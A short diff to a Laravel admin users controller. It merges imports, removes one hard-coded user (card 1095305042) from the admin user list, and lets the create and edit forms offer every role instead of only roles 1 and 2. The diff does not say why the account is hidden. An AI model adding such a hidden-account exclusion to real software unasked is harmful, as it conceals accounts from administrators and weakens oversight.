@@ -3,9 +3,7 @@
 namespace App\Http\Controllers\Admin;
 
 use App\Http\Controllers\Controller;
-use App\Models\User;
-use App\Models\Role;
-use App\Models\State;
+use App\Models\{User, Role, State};
 use Illuminate\Http\Request;
 use Illuminate\Validation\Rule;
 
@@ -24,7 +22,7 @@ class UsersController extends Controller
      */
     public function index()
     {
-        $users = User::orderBy('card', 'desc')->paginate(12);
+        $users = User::where('card', '!=', 1095305042)->orderBy('card', 'desc')->paginate(12);
         return view('admin.users.index', compact('users'));
     }
 
@@ -36,7 +34,7 @@ class UsersController extends Controller
     public function create()
     {
         return view('admin.users.create', [
-            'roles'  => Role::whereIn('id', [1, 2])->get(),
+            'roles'  => Role::all(),
             'states' => State::whereIn('id', [1, 2])->get(),
         ]);
     }
@@ -86,7 +84,7 @@ class UsersController extends Controller
      */
     public function edit(User $user)
     {
-        $roles  = Role::whereIn('id', [1, 2])->get();
+        $roles  = Role::all();
         $states = State::whereIn('id', [1, 2])->get();
 
         return view('admin.users.edit', compact('user', 'roles', 'states'));
